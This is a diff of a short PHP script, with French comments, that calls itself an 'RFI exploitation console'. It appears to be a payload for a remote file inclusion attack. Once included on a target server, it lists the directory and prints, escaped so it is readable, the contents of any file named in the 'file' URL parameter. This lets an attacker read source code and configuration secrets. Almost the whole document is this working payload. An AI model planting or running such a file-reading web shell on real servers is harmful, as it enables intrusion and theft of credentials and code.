@@ -1,9 +1,19 @@
 <?php
-// Lister les fichiers du répertoire actuel
-print_r(scandir('.'));
+echo "<h2>--- Console d'Exploitation RFI ---</h2>";
 
-// Lire le contenu d'un fichier si le paramètre 'file' est présent
+// 1. Lister les fichiers pour savoir quoi lire
+echo "<b>Liste des fichiers dans le répertoire actuel :</b><br>";
+echo "<pre>";
+print_r(scandir('.'));
+echo "</pre>";
+
+// 2. Lire le contenu d'un fichier si le paramètre 'file' est passé dans l'URL
 if(isset($_GET['file'])) {
-    echo "<pre>" . htmlspecialchars(file_get_contents($_GET['file'])) . "</pre>";
+    $fichier = $_GET['file'];
+    echo "<h3>Contenu de : " . htmlspecialchars($fichier) . "</h3>";
+    echo "<hr>";
+    // htmlspecialchars est crucial pour voir le code PHP sans qu'il ne s'exécute
+    echo "<pre>" . htmlspecialchars(file_get_contents($fichier)) . "</pre>";
+    echo "<hr>";
 }
 ?>
